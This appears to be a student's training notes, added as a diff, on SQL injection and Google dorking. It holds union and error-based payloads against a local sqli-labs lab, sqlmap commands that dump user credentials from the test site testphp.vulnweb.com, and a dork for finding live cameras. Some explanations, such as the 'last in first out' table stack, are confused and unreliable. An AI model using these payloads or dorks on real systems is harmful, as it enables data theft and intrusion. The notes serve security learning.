@@ -1,0 +1,226 @@
+ERROR BASED SQL INJECTION
+==========================
+
+Error based SQL Injection is type of SQL Injection technique to make the error message show Data in just the form of Database Errors instead of SQL Syntax error like in Union Based, for when we have a blind vulnerability that shows error, so we can extract sensitive data from the database directly.
+
+The errors are very useful during the time of development of a web application but they should be disabled on a Live Website, because errors always shows the Internal Sensitive Data of the Database. 
+
+Error Based SQL Injection works on the ASP Technology (asp.net , aspx) which is a open source server side web application Developed by Microsoft, using the Microsoft MSSQL Server. 
+
+
+TRUE CONDITION :
+---------------
+
+Here 1 is True and 0 is False. 
+
+OR Gate Representation---
+
+?cat=1 or 1=0  ------ True
+?cat=4 or 1=1 -------True
+?cat=12 or 1=1 -----True
+?cat=12 or 1=0 -----False
+
+And Gate Representation---
+
+?cat=1 and 1=1 -----True
+?cat=1 and 1=0 -----False
+?cat=12 and 1=1 ---False
+?cat=12 and 1=0 ---False
+
+
+AND GATE REPRESENTATION
+
+A    |    B    |    Resultant |
+------------------------------|
+0    |    0    |    0         |
+0    |    1    |    0         |    
+1    |    0    |    0         |
+1    |    1    |    1         |
+
+Checking the Last True Condition it states : 
+
+1 & 1  = 1    ie;   1*1=1  or True*True = True 
+ 
+MAKING THIS TRUE CONDITION FALSE
+
+1 & 0  = 0    ie;   1*0=0  or True*False = False 
+
+
+Error Based SQL Injection works by generating a error condition in the SQL Syntax, so that the Database reverts back with the Error along with the Sensitive Data.
+
+
+DEMONSTRATION
+===============
+
+Normally a SQL Syntax can goes like :  
+
+bhai.com/account.aspx?id=10  |  ?id=10 and 1 =1 ;		//TRUE
+Which means a Condition is true and it will revert a Genuine Website.
+
+- So, we can change and can create a Error in the SQL Command by : 
+        ?id=10 and 1=0;					//FALSE
+Which will create and revert a Errors of the Database.
+
+
+
+------------------------------------------------------------------
+
+
+CONDITIONS OF ERROR BASED SQLI
+===============================
+= Only One Query can execute at a Particular time, not like finding out the database and versions etc we do on Union Based.
+= It works on the basis of Last In First Out (LIFO).
+= Only the Top Table of the Database can be accessed at a single particular time. Same  goes for Columns and then for Rows.
+
+-----------------------------------------------------------------
+
+
+STRUCTURE OF LAST IN FIRST OUT TABLES :
+
+	|----------------|
+	|Others          |		Others will be lastly added and
+	|----------------|      firstly out. If you want to get the
+	|Guestbook       |		data of "Users", you have to go
+	|----------------|      through "Others" and "Guestbook"
+	|Users           |
+	|----------------|
+	|Images          |
+	|----------------|
+
+------------------------------------------------------------------
+
+
+First as same as Union Based SQLI, we start finding the number of columns and the Vulnerable column. Suppose the vulnerable column is 10.
+
+After creating a Error, We will start executing the command and extracting the data from the First Table from the Database.
+
+For selecting the Top First Table (Cause we cannot directly go a “n” number column/table), 
+
+= IS USED FOR A COMMAND.
+
+=	bhai.com/account.php?id=10 and 1=0 select top 1 table_name from information_schema.tables--+
+
+This will extract and give the Data of the First Table from the Database Including its name and other entities. If the Data is Juicy then extract it, else we go for the next tables and columns.
+
+----
+
+For deselecting the Top/Current Table and selecting/extracting the next table, 
+
+=	bhai.com?id=10 and 1=0 select top 1 table_name from information_schema.tables where table_name not in (“Name of the previous tables”)
+
+Here we are selecting the next Top Table excluding the Previous one and then extracting its data through the Database Errors. For eg. if the First Top Table is named as “Others”, the query will be :  
+?id=10 and 1=0 select top 1 table_name from information_schema.tables where table_name not in (“others" , "guestbook")--+
+
+--------
+
+After getting through our Juicy Table, we go for the data which are situated in there columns.
+
+=	?id=10 and 1=0 select top 1 column_name from information_schema.columns where table_name not in (“others”, "guestbook")
+
+and column_name not in ("Previous Column Name")
+
+Here we get the data extracted of the Columns which are not of the Table named "Others" and "Guestbook".
+
+
+------------------------------------------------------------------
+
+Error Commands:-
+--------------------------
+
+http://localhost/sqli-labs-master/Less-1/?id=1
+
+http://localhost/sqli-labs-master/Less-1/?id=0' or 1=1--+
+
+http://localhost/sqli-labs-master/Less-1/?id=0' order by 1--+
+
+http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,3--+
+
+http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,database(),version()--+
+
+http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+
+
+http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="users"--+
+
+http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,database(),group_concat(id,0x3a,username,0x3a,password,0x0a) from users--+
+
+
+
+STACKED QUERY SQL INJECTION
+============================
+
+Stacked Query SQL Injection is the one which can execute by terminating the original query and adding a new one, it will be possible to modify data and call stored procedures like creating, deleting and modifying the Database with there entities. This technique is massively used in SQL injection attacks and understanding its principle is essential to a sound understanding of this security issue.
+ 
+This can done by SQL Injection Automated Tools like “SQLMAP” etc like "Hackbar".
+
+https://www.youtube.com/watch?v=6cd4xY9_DNA
+
+
+SQLMAP
+=======
+SQLMAP is an open source python based penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many features lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
+
+DEMONSTRATION ON KALI LINUX
+============================
+SQLMAP is a CLI Based Tool which only runs on the Terminal of Kali Linux. Further are the steps to use this automated tool.
+
+Target : DVWA , http://testphp.vulnweb.com/
+
+First Step is finding a GET Method in a Web Application, and then further enumerating it through sqlmap.
+
+= Commands goes with this.
+
+= 	sqlmap
+
+= 	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” 
+(-u or --url for entering a url having a GET Parameter)
+
+=	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” --dbs
+(--dbs helps in executing the database() query in the vulnerable column which sqlmap founds by itself only.)
+
+=	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” --current -user
+(This will lists out the Current User using the Database)
+
+=	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” -D acuart --tables
+(After getting know the Database Name, we put the name for getting the sqlmap to knows that this is the Database we want to further enumerate. --tables helps us to get to know all of the Table names of that particular Database).
+
+=	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” -D acuart -T users --columns
+(This will further enumerate and tells us the Columns names of our desired table.)
+
+=	sqlmap --url “http://testphp.vulnweb.com/search.php?test=query” -D acuart -T users -C email,name,pass,phone,uname --dump
+(Dumping all the necessary Data of the Columns of table User and extracting it.)
+
+------------------------------------------------------------------------------------------
+
+
+
+GOOGLE DORKING
+================ 
+Google dorking, also known as Google hacking, can return information that is difficult to locate through simple search queries. That description includes information that is not intended for public viewing but that has not been adequately protected. Hackers use Google Dorking to extract only the Desired Data what they exactly want. 
+
+DORKS COMMANDS
+=================
+
+=	intitle : This allows a attacker to search for pages with specific text in their HTML =	  title. So intitle: “login page” will help a hacker to find out the web titled “login page”.
+=	inurl :  This allows a hacker to search for pages based on the text contained in the URL eg. “inurl : login.php”.
+=	intext :  This operator searches the entire content of a given page for keywords supplied by the attacker.
+=	site : limits the scope of a query to a single website.
+=	cache : This shows the attacker the cached/previous stored version of a website.
+=	filetype : THis helps in differentiating a attacker the filetype/extension of a particular file he/she is searching.
+=	indexof : This will helps in finding out the whole index a website is saving for multile files and is open to surf.
+
+=	Finding Live Cameras - (inurl = “/view/view.shtml?id-”) the resultant will be having the live cameras of Axis Company.
+
+Google Dork Database for Cyber Security Professionals - https://www.exploit-db.com/google-hacking-database/
+
+
+Exploitation Database for Hackers : exploit-db.com (Offensive Security)
+
+-----------------------------------------------------------------------------------------
+
+TASKS
+=====
+
+1. Study of Union Based SQL Injection in depth. 
+2. Use SQLMAP on testphp.vulnweb.com with the steps I have showed.
+3. 10 % Codes for Special Characters in URL.
+------------------------------------------------------------------------------------
